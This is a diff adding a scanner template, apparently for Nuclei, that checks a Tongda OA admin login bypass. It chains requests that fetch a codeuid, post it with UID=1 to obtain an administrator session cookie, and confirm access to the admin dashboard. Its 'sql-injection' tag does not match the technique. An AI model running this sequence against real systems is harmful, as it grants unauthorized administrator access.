@@ -1,0 +1,65 @@
+id: poc-yaml-tongda-oa-login-bypass
+info:
+  name: Tongda OA logincheck_code Admin Login Bypass Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+http:
+  - id: initial-codeuid-request
+    method: GET
+    path:
+      - "{{BaseURL}}/ispirit/login_code.php"
+    extractors:
+      - type: regex
+        name: codeuid
+        internal: true
+        group: 1
+        regex:
+          - "\\\"codeuid\\\":\\\"(?P<codeuid>.*?)\\\""
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: logincheck-code
+    method: POST
+    path:
+      - "{{BaseURL}}/logincheck_code.php"
+    headers:
+      Upgrade-Insecure-Requests: "1"
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      CODEUID={{codeuid}}&UID=1
+    extractors:
+      - type: regex
+        name: PHPSESSID
+        internal: true
+        group: 1
+        regex:
+          - "PHPSESSID=(?P<PHPSESSID>.*?);"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"status\":1"
+
+  - id: management-dashboard-access
+    method: GET
+    path:
+      - "{{BaseURL}}/general/index.php?is_modify_pwd=1"
+    headers:
+      Cookie: PHPSESSID={{PHPSESSID}}
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "\"admin\""
+          - "\"系统管理员\""
+          - "修改个人资料"
+          - "管理中心"
+      - type: dsl
+        dsl:
+          - "contains(gbk_decode(body), \"\\\"admin\\\"\") && contains(gbk_decode(body), \"\\\"系统管理员\\\"\") && contains(gbk_decode(body), \"修改个人资料\") && contains(gbk_decode(body), \"管理中心\")"
